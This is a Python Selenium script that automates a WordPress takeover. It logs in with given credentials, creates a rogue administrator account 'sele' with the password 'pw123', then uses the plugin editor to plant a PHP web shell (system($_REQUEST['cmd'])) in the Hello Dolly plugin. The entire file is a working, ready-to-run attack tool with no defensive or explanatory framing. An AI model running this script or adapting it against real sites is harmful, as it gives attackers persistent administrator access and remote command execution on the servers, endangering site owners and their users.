#!/usr/bin/python3

from selenium import webdriver
import argparse
import time
from selenium.webdriver.common.keys import Keys

def login(user, password):
    try: 
        driver.get(args.url+'/wp-login.php')
        print(f'Login: {driver.title}')
        driver.find_element_by_name('log').clear()
        driver.find_element_by_name('pwd').clear()
        time.sleep(1)
        driver.find_element_by_name('log').send_keys(user)
        driver.find_element_by_name('pwd').send_keys(password)
        driver.find_element_by_name('wp-submit').click()
        #print(driver.page_source)
        if 'wp-admin' in driver.current_url:
            print("Login Works")
            return True
    except:
        pass
    return False

def crate_user():
    if 'users.php' not in driver.page_source:
        print('User have no Administartion rights')
        exit()
    #driver.find_element_by_link_text("Users").click()
    #driver.find_element_by_link_text("Add New").click()
    driver.find_element_by_xpath("//a[@href ='users.php']").click()
    print(driver.current_url)
    driver.find_element_by_xpath("//a[@href ='user-new.php']").click()
    print(driver.current_url)
    time.sleep(1)
    # set user data
    driver.find_element_by_id('user_login').send_keys('sele')
    driver.find_element_by_id('email').send_keys('sele@example.de')
    driver.find_element_by_id('pass1').clear()
    driver.find_element_by_id('pass1').send_keys('pw123')
    time.sleep(1)
    driver.find_element_by_name('pw_weak').click()
    driver.find_element_by_id('role').send_keys('Administrator')
    driver.find_element_by_id('createusersub').click()
    print(driver.current_url)

def backdoor():
    print(driver.get_window_size())
    driver.find_element_by_xpath("//a[@href ='tools.php']").click()
    print(driver.current_url)
    driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
    time.sleep(1)
    #driver.find_element_by_class_name('file-editor-warning-dismiss').click()
    time.sleep(1)
    driver.find_element_by_id('plugin').send_keys('Hello Dolly')
    driver.find_element_by_xpath("//input[@value='Select']").click()

    print(driver.current_url)

    payload = "\".<?php system($_REQUEST['cmd']); ?>.\""
    #driver.find_element_by_xpath("//div[@role='textbox']").clear()
    #text = driver.find_element_by_xpath("//div[@role='textbox']").text

    time.sleep(1)
    
    #Works - overwrite the plugin text
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"c")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(payload)

    time.sleep(2)

def main():
    print("\n--- Start --- ")
    if not login(args.user, args.password):
       print("Login Failed")
    print(driver.current_url)
    time.sleep(1)
    crate_user()
    time.sleep(1)
    login('sele','pw123')
    time.sleep(1)
    backdoor()

    print("Ende")
    time.sleep(2)
    #driver.quit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Selenium')
    #group_enum = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str)
    parser.add_argument('-U', '--user', required=True, type=str)
    parser.add_argument('-P', '--password', required=True, type=str)
    parser.add_argument('-d', '--driver', nargs='?', default='/home/kali/Desktop/sele/chromedriver', type=str)
    parser.add_argument('-v', '--verbose', help='')
    parser.add_argument('--gui', action=argparse.BooleanOptionalAction, default=False)
    args = parser.parse_args()
    
    options = None
    if not args.gui:
        options = webdriver.ChromeOptions()
        #options.add_argument("log-level=3")
        #options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument('headless')
        #options.add_argument('window-size=1920x1080')
        options.add_argument("disable-gpu")
    driver = webdriver.Chrome(args.driver, chrome_options=options)
    driver.set_window_size(1100,900)
    main()